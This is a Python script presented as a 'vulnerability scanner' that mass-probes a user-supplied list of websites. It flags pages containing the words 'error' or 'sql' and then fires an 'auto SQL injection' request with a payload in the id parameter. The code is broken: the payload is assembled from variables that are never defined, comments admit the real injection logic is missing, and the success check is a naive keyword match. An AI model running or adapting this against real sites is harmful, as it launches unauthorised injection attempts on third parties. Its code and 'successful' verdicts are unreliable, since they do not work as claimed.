#VULNSCAN
print("""'\033[1;92m'                                                 

╔╗──╔╦╗─╔╦╗──╔═╗─╔╦═══╦═══╦═══╦═╗─╔╗
║╚╗╔╝║║─║║║──║║╚╗║║╔═╗║╔═╗║╔═╗║║╚╗║║ \033[1;31;36m  
╚╗║║╔╣║─║║║──║╔╗╚╝║╚══╣║─╚╣║─║║╔╗╚╝║\033[4;37m
─║╚╝║║║─║║║─╔╣║╚╗║╠══╗║║─╔╣╚═╝║║╚╗║║
─╚╗╔╝║╚═╝║╚═╝║║─║║║╚═╝║╚═╝║╔═╗║║─║║║
──╚╝─╚═══╩═══╩╝─╚═╩═══╩═══╩╝─╚╩╝─╚═╝ 

               \033[1;32m Coded by: Mr.Dark Hcktvst""") 
print("\033[1;31;36m__________________________________________________________")

import requests
from termcolor import colored
from concurrent.futures import ThreadPoolExecutor

def check_website(website):
    try:
        response = requests.get(website)
        if response.status_code == 200:
            print(colored(f"{website} is reachable", 'green'))
            # Check for SQL Injection vulnerability
            if "error" in response.text.lower() or "sql" in response.text.lower():
                print(colored(f"{website} may be vulnerable to SQL Injection", 'cyan'))
                # Auto SQL Injection
                auto_sql_injection(website)
        else:
            print(colored(f"{website} returned status code {response.status_code}", 'yellow'))
    except requests.exceptions.RequestException:
        print(colored(f"{website} is not reachable", 'red'))

def auto_sql_injection(website):
    # Simulated auto SQL injection process
    print(colored(f"Performing auto SQL injection on {website}...", 'magenta'))
    
    # Here you would implement the actual SQL injection logic
    # Using the provided SQL injection techniques and payloads
    
    # Example:
    payload = f"{order_start}{w1}{w2}{w3}{w3a}{w4}{w5}{w6}{w7}{w8}{w9}{w10}{union}{union1}{union2}{bof}{bof2}{urlencode}{double_url}{whitespaces}{basic_1}"
    url = f"{website}?id={payload}"
    response = requests.get(url)
    if "error" in response.text.lower() or "sql" in response.text.lower():
        print(colored(f"SQL Injection successful on {website}", 'green'))
    else:
        print(colored(f"SQL Injection failed on {website}", 'red'))

def scan_websites(file_path):
    with open(file_path, 'r') as file:
        websites = [website.strip() for website in file.readlines()]

    with ThreadPoolExecutor(max_workers=10) as executor:
        executor.map(check_website, websites)

if __name__ == "__main__":
    file_path = input("Enter the file path containing websites: ")
    scan_websites(file_path)
